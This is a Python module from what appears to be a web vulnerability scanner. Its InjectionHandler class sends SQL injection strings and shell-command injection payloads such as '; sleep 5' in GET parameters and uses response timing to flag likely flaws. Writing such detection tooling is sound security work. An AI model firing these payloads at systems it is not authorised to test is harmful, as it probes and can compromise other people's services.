import logging
import re
from typing import Dict, Any, List

from ..models import WebRunResult, WebCategory, WebFinding, WebSeverity
from ..base import WebHandlerBase

logger = logging.getLogger(__name__)

class InjectionHandler(WebHandlerBase):
    """Handler for detecting and exploiting injection-based vulnerabilities (SQLi, NoSQLi, Command Injection)."""

    def analyze(self, target: str, **kwargs) -> WebRunResult:
        result = self.create_empty_result(WebCategory.INJECTION, target)
        
        # SQLi detection logic
        if self._check_sqli(target):
             self.add_finding(
                vulnerability_id="sqli_detected",
                category=WebCategory.INJECTION,
                description="Potential SQL Injection detected via error/boolean reflection.",
                severity=WebSeverity.HIGH,
                url=target
             )

        # Command Injection logic
        if self._check_command_injection(target):
            self.add_finding(
                vulnerability_id="command_injection_detected",
                category=WebCategory.INJECTION,
                description="Potential Command Injection detected via timing/output.",
                severity=WebSeverity.CRITICAL,
                url=target
            )

        result.findings = self.findings
        result.summary = f"Injection analysis complete for {target}."
        result.statistics = {"findings_count": len(self.findings)}
        
        return result

    def _check_sqli(self, target: str) -> bool:
        """Simple SQLi detection using common error-based triggers."""
        sqli_payloads = ["'", "''", "1' OR '1'='1", "1' WAITFOR DELAY '0:0:5'--"]
        for payload in sqli_payloads:
            try:
                # Blind SQLi detection via timing
                import time
                start = time.time()
                self.request("GET", target, params={"q": payload})
                if time.time() - start > 4: # Timing threshold
                    return True
            except Exception:
                pass
        return False

    def _check_command_injection(self, target: str) -> bool:
        """Simple Command Injection detection using sleep/timing."""
        cmd_payloads = ["; sleep 5", "| sleep 5", "`sleep 5`", "& sleep 5"]
        for payload in cmd_payloads:
             try:
                import time
                start = time.time()
                self.request("GET", target, params={"cmd": payload})
                if time.time() - start > 4:
                    return True
             except Exception:
                pass
        return False
